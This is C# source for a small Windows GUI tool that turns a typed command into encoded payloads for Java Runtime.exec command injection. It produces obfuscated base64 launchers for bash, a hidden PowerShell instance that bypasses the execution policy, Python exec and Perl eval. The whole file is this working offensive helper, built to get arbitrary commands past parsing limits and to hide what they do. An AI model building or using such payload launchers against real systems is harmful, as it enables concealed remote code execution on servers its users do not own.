using System;
using System.Text;
using System.Windows;

namespace Java_lang_Runtime_exec_payload_encode
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }


        private void Button_Click(object sender, RoutedEventArgs e)
        {
            if (bash.IsChecked == true)
            {
                Encode("bash");
            }
            else if (powershell.IsChecked == true)
            {
                Encode("powershell");
            }
            else if (python.IsChecked == true)
            {
                Encode("python");
            }
            else if (perl.IsChecked == true)
            {
                Encode("perl");
            }
            else
            {
                output.Text = "No Command Type entered！";
            }
        }
        private void Encode(string f)
        {
            string cmd = input.Text;
            if (cmd == "") {
                output.Text = "No command entered！";
            }
            else
            {   
                // 转为字节类型，linux默认是utf-8,Windows是gb2312
                byte[] bytes = Encoding.UTF8.GetBytes(cmd);
                switch (f)
                {
                    case "bash":
                        cmd = Convert.ToBase64String(bytes);
                        cmd = "bash -c {echo," + cmd + "}|{base64,-d}|{bash,-i}";
                        break;
                    case "powershell":
                        bytes = Encoding.Unicode.GetBytes(cmd);   // Windows下的编码转换
                        cmd = Convert.ToBase64String(bytes);
                        cmd = "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc " + cmd;
                        break;
                    case "python":
                        cmd = Convert.ToBase64String(bytes);
                        cmd = "python -c exec('" + cmd + "'.decode('base64'))";
                        break;
                    case "perl":
                        cmd = Convert.ToBase64String(bytes);
                        cmd = "perl -MMIME::Base64 -e eval(decode_base64('" + cmd + "'))";
                        break;
                }

                output.Text = cmd;
            }

        }

        // 单选框点击事件
        private void Bash_Checked(object sender, RoutedEventArgs e)
        {
            Encode("bash");
        }

        private void Powershell_Checked(object sender, RoutedEventArgs e)
        {
            Encode("powershell");
        }

        private void Python_Checked(object sender, RoutedEventArgs e)
        {
            Encode("python");
        }

        private void Perl_Checked(object sender, RoutedEventArgs e)
        {
            Encode("perl");
        }
    }
}
